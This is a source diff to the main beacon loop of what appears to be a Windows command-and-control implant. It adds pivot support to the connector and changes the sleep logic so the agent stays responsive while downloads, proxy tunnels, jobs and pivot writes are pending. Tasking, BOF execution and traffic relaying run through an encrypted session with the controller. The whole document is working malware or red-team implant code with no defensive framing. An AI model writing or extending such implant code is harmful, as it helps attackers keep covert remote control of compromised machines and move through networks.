@@ -41,6 +41,8 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 	g_Agent = new Agent();
 	g_Connector = CreateConnector();
 
+	g_Connector->SetPivotter(g_Agent->pivotter);
+
 	g_AsyncBofManager = new Boffer();
 	g_AsyncBofManager->Initialize();
 
@@ -60,11 +62,14 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 			continue;
 
 		do {
+			BOOL justSentOutput = FALSE;
+
 			if (packerOut->datasize() > 4) {
 				packerOut->Set32(0, packerOut->datasize());
 				g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
 				packerOut->Clear(TRUE);
 				packerOut->Pack32(0);
+				justSentOutput = TRUE;
 			}
 			else {
 				g_Connector->Exchange(nullptr, 0, g_Agent->SessionKey);
@@ -72,8 +77,8 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 
 			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData())
 				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
-			g_Connector->RecvClear();
 
+			g_Connector->RecvClear();
 			g_Agent->downloader->ProcessDownloader(packerOut);
 			g_Agent->jober->ProcessJobs(packerOut);
 			g_Agent->proxyfire->ProcessTunnels(packerOut);
@@ -81,8 +86,15 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 			g_AsyncBofManager->ProcessAsyncBofs(packerOut);
 
 			if (g_Agent->IsActive()) {
-				const BOOL hasOutput = (packerOut->datasize() >= 8);
-				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
+				BOOL hasOutput = (packerOut->datasize() >= 8) || justSentOutput;
+				if (!hasOutput)
+					hasOutput = (g_Agent->downloader->downloads.size() > 0) || (g_Agent->proxyfire->tunnels.size() > 0) || (g_Agent->jober->jobs.size() > 0);
+
+				DWORD pollIntervalMs = 0;
+				if (g_Agent->pivotter->pendingWrite)
+					pollIntervalMs = 10;
+
+				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput, pollIntervalMs);
 			}
 
 		} while (g_Connector->IsConnected() && g_Agent->IsActive());
